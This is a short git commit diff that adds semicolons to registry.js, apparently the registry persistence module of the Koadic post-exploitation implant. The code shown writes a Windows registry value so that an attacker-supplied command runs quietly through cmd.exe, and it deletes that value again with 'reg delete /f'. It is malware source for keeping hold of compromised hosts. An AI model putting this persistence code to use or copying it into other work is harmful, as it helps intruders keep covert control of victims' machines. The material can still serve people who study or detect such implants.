a7c71b882f5896ccb24e12e016aeacd8abf64c4a
TheNaterz <nate.caroe@risksense.com>
2018-09-13 12:54:20 -0600

    added some semicolons

--- data/implant/persist/registry.js
+++ data/implant/persist/registry.js
@@ -21,13 +21,13 @@ try
       default:
         break;
     }
-    var retval = Koadic.shell.exec("reg delete "+hkeyname+"\\"+path+" /v "+key+" /f", "~DIRECTORY~\\"+Koadic.uuid()+".txt")
+    var retval = Koadic.shell.exec("reg delete "+hkeyname+"\\"+path+" /v "+key+" /f", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
     Koadic.work.report(retval, headers);
   }
   else
   {
-    var comspec = Koadic.shell.exec("echo %comspec%", "~DIRECTORY~\\"+Koadic.uuid()+".txt")
-    comspec = comspec.split(" \r\n")[0]
+    var comspec = Koadic.shell.exec("echo %comspec%", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
+    comspec = comspec.split(" \r\n")[0];
     Koadic.registry.write(~HKEY~, path, key, "\""+comspec+"\" /q /c ~CMD~", Koadic.registry.STRING);
     headers["Task"] = "AddKey";
     var retval = Koadic.registry.read(~HKEY~, path, key, Koadic.registry.STRING).SValue;
